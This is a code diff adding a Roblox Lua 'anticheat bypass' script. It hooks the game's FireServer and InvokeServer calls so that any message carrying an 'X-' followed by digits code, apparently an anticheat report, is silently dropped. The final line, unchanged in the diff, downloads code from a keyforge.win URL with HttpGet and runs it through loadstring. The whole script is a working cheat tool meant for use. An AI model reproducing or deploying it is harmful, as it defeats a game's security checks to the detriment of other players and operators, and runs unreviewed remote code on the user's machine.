@@ -1,1 +1,52 @@
+local function containsXCode(v)
+    if typeof(v) ~= "string" then return false end
+    return v:find("[Xx]%-%d+") ~= nil
+end
+
+local function scanDeep(v, depth)
+    depth = depth or 0
+    if depth > 6 then return false end
+    local t = typeof(v)
+    if t == "string" then
+        return containsXCode(v)
+    elseif t == "table" then
+        for k, val in pairs(v) do
+            if containsXCode(tostring(k)) or scanDeep(val, depth + 1) then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function hasXCode(args)
+    for i = 1, #args do
+        if scanDeep(args[i]) then return true end
+    end
+    return false
+end
+
+pcall(function()
+    local dummyEvent = Instance.new("RemoteEvent")
+    local dummyFunc = Instance.new("RemoteFunction")
+
+    local oldFire
+    oldFire = hookfunction(dummyEvent.FireServer, newcclosure(function(self, ...)
+        local args = {...}
+        if hasXCode(args) then return end
+        return oldFire(self, table.unpack(args))
+    end))
+
+    local oldInvoke
+    oldInvoke = hookfunction(dummyFunc.InvokeServer, newcclosure(function(self, ...)
+        local args = {...}
+        if hasXCode(args) then return nil end
+        return oldInvoke(self, table.unpack(args))
+    end))
+
+    dummyEvent:Destroy()
+    dummyFunc:Destroy()
+end)
+print("Anticheat Bypass Loaded!")
+task.wait(1)
 loadstring(game:HttpGet("https://www.keyforge.win/v1/load/cms7rbqgi0qhxtckvhjv9ftbe?e=1&script=cmsd0o4500sa8c3kvldoknpi6&lsig=0O-GOVW9i0k2OqC7_mAELGt_HoRkbXxMfzaM2rOdSBM".."&_cb="..tostring(os.clock()).."-"..tostring(math.random(1,1e9)),true))()
